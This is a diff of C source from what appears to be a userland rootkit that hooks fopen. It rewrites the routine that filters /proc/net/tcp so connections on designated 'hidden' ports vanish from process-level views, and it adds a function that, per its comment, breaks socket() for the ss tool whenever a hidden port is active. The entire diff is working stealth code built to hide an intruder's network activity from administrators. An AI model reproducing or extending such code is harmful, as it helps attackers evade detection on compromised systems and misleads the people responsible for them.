@@ -38,35 +38,62 @@ int is_hidden_port(int port){
     return hidden_status;
 }
 
-FILE *forge_procnet(const char *pathname){
-    FILE *tmp = tmpfile(), *pnt;
-    char line[LINE_MAX], raddr[128],
-         laddr[128], etc[128];
+int secret_connection(char line[]){
+    char raddr[128], laddr[128], etc[128];
     unsigned long rxq, txq, t_len,
                   retr, inode;
-    int lport, rport, d,
-        state, uid, t_run,
-        tout;
+    int lport, rport, d, state, uid, t_run, tout;
+
+    char *fmt = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
+    sscanf(line, fmt, &d, laddr, &lport, raddr, &rport, &state, &txq,
+                             &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
+                             etc);
+    memset(line, 0, strlen(line));
+
+
+    if(is_hidden_port(lport) || is_hidden_port(rport))
+        return 1;
+
+    return 0;
+}
+
+// ss uses socket to list open sockets. socket()
+// uses this function to break itself if a. calling process is ss
+//                                     + b. a hidden port is in use
+int hideport_alive(void){
+    char line[LINE_MAX];
+    FILE *fp;
+    int status = 0;
+
+    hook(CFOPEN);
+    fp = call(CFOPEN, "/proc/net/tcp", "r");
+    if(fp == NULL) return 0;
+
+    while(fgets(line, sizeof(line), fp) != NULL){
+        if(secret_connection(line)){
+            status = 1;
+            break;
+        }
+    }
+
+    fclose(fp);
+    return status;
+}
+
+FILE *forge_procnet(const char *pathname){
+    FILE *tmp = tmpfile(), *pnt;
+    char line[LINE_MAX];
 
     hook(CFOPEN);
     pnt = call(CFOPEN, pathname, "r");
     if(pnt == NULL) return NULL;
     if(tmp == NULL) return pnt;
 
-    char *fmt = "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
+    
     /* begin reading entries from said procnet file */
-    while(fgets(line, sizeof(line), pnt) != NULL){
-        /* read information from the current entry so we can see
-           whether or not it should be hidden. */
-        sscanf(line, fmt, &d, laddr, &lport, raddr, &rport, &state, &txq,
-                          &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
-                          etc);
-
-        /* write information about the connection as long as it's
-           not one that should be hidden... */
-        if(!is_hidden_port(lport) && !is_hidden_port(rport))
+    while(fgets(line, sizeof(line), pnt) != NULL)
+        if(!secret_connection(line))
             fputs(line, tmp);
-    }
 
     fclose(pnt);
     fseek(tmp, 0, SEEK_SET);
